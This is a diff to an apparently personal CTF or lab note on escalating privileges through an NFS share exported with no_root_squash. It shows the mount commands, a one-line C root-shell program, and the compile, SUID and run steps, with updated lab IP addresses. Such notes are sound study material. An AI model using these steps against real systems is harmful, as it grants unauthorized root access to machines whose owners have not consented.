@@ -5,25 +5,25 @@ If we see **no_root_squash,** this means that the folder attached is shareable a
 ![[Pasted image 20250214220356.png]]
 On our machine
 ```bash
-showmount -e 10.10.182.186   <---- Target IP
-sudo mount -o rw,vers=3 10.10.182.186:/tmp /tmp/mountme
+showmount -e 10.129.2.210   <---- Target IP
+sudo mount -o rw,vers=3 10.129.2.210:/tmp /tmp/mountme
 ```
 
 ```bash
-echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/x.c
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash -p"); return 0; }' > /tmp/mountme/p.c
 ```
 
 On compromised host
 ```bash
-gcc /tmp/x.c -o /tmp/x  
+gcc /tmp/p.c -o /tmp/p  
 ```
 
 On our machine
 ```bash
-chmod +s /tmp/mountme/x
+sudo chmod +s /tmp/mountme/p
 ```
 
 On compromised host
 ```bash
-/tmp/x
+/tmp/p
 ```
